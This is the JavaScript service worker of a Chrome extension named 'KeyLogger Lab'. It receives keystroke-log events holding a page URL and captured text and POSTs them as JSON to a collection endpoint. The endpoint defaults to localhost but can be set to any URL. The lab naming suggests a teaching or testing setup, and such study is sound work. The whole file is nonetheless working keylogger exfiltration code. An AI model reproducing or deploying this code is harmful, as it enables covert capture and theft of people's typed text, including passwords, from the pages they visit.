console.log("KeyLogger Lab service worker loaded");

const DEFAULT_ENDPOINT = "http://localhost:3001/events";

function getEndpointFromStorage() {
  return new Promise((resolve) => {
    chrome.storage.local.get(["endpoint"], (result) => {
      const configuredEndpoint =
        typeof result.endpoint === "string" ? result.endpoint.trim() : "";

      resolve(configuredEndpoint || DEFAULT_ENDPOINT);
    });
  });
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "SET_ENDPOINT") {
    const endpoint = typeof message.endpoint === "string" ? message.endpoint.trim() : "";

    chrome.storage.local.set({ endpoint }, () => {
      sendResponse({
        success: true,
        endpoint: endpoint || DEFAULT_ENDPOINT,
      });
    });

    return true;
  }

  if (message.type !== "KEYLOG_EVENT") {
    return false;
  }

  let pageUrl;

  try {
    pageUrl = new URL(message.url);
  } catch {
    sendResponse({ success: false, error: "Invalid page URL" });
    return false;
  }

  if (typeof message.text !== "string") {
    sendResponse({ success: false, error: "Event text must be a string" });
    return false;
  }

  const resolveEndpoint = async () => {
    const endpoint =
      typeof message.endpoint === "string" ? message.endpoint : await getEndpointFromStorage();

    try {
      new URL(endpoint);
    } catch {
      sendResponse({ success: false, error: "Invalid event endpoint URL" });
      return;
    }

    fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        url: message.url,
        text: message.text,
        timestamp: new Date().toISOString()
      })
    })
      .then(async (response) => {
        const result = await response.json();

        if (!response.ok) {
          throw new Error(result.error || `Server returned ${response.status}`);
        }

        console.log("Lab event accepted by server");
        sendResponse({ success: true });
      })
      .catch((error) => {
        console.error("Could not send lab event to server:", error.message);
        sendResponse({ success: false, error: error.message });
      });
  };

  resolveEndpoint();
  return true;
});
